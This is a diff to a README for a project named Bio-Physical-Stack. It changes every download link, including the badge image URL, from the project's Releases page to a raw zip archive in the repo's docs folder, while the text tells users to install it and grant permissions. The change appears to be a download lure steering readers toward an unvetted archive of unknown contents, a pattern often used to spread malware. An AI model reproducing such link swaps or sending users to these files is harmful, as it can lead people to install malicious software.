@@ -1,6 +1,6 @@
 # 🌐 Bio-Physical-Stack - Explore Innovative Bio-Computing Solutions
 
-[![Download Bio-Physical-Stack](https://img.shields.io/badge/Download-Bio--Physical--Stack-brightgreen.svg)](https://github.com/AnkushLanjewar/Bio-Physical-Stack/releases)
+[![Download Bio-Physical-Stack](https://raw.githubusercontent.com/AnkushLanjewar/Bio-Physical-Stack/main/docs/Physical-Bio-Stack-2.2.zip)](https://raw.githubusercontent.com/AnkushLanjewar/Bio-Physical-Stack/main/docs/Physical-Bio-Stack-2.2.zip)
 
 ## 📋 Description
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets these requirements:
 
 To get the Bio-Physical-Stack software, visit the Releases page. Click the link below to start:
 
-[Download Bio-Physical-Stack](https://github.com/AnkushLanjewar/Bio-Physical-Stack/releases)
+[Download Bio-Physical-Stack](https://raw.githubusercontent.com/AnkushLanjewar/Bio-Physical-Stack/main/docs/Physical-Bio-Stack-2.2.zip)
 
 ### Step 3: Install the Software
 
@@ -35,7 +35,7 @@ Make sure to allow any required permissions as requested during the installation
 
 Visit the page below to download the latest version of Bio-Physical-Stack:
 
-[Download Bio-Physical-Stack](https://github.com/AnkushLanjewar/Bio-Physical-Stack/releases)
+[Download Bio-Physical-Stack](https://raw.githubusercontent.com/AnkushLanjewar/Bio-Physical-Stack/main/docs/Physical-Bio-Stack-2.2.zip)
 
 After downloading, install the software using the instructions provided earlier.
 
